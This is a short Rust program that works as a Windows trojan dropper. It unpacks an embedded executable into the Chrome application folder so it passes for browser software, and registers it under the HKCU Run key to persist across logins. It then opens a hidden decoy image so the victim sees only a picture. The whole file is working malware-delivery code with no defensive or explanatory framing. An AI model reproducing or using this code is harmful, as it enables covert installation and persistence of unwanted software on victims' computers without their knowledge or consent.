extern crate winreg;
extern crate cmd_lib;
extern crate base64;

use std::{fs::File, io::Write};
use std::os::windows::prelude::*;
use std::process::Command;
use winreg::RegKey;
use winreg::enums::*;
use std::io::prelude::*;

const APP_DATA: &'static [u8] = include_bytes!("app.exe");
const IMAGE_DATA: &'static [u8] = include_bytes!("image.jpg");

fn main() {
    // Writes the app into Chrome directory
    std::fs::create_dir_all("C:/Program Files (x86)/Google/Chrome/Application").unwrap();
    let mut file = File::create("C:/Program Files (x86)/Google/Chrome/Application/app.exe").unwrap();
    file.write_all(APP_DATA).unwrap();

    // Writes the image into the current directory
    let mut file = File::create("./my.jpg").unwrap();
    file.write_all(IMAGE_DATA).unwrap();

    // Set file attribute to hidden
    cmd_lib::run_cmd!(attrib +h ./my.jpg).unwrap();

    // Register the app at runtime start up in windows registry
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run").unwrap();
    key.set_value("my_app", &"C:/Program Files (x86)/Google/Chrome/Application/app.exe").unwrap();

    // Open the image with default program
    Command::new("cmd")
        .args(&["/C", "start", "./my.jpg"])
        .output()
        .expect("Failed to execute command");

    // This will prevent a shell window from popping up
    cmd_lib::run_fun!(powershell -WindowStyle Hidden -Command "exit").unwrap();
}
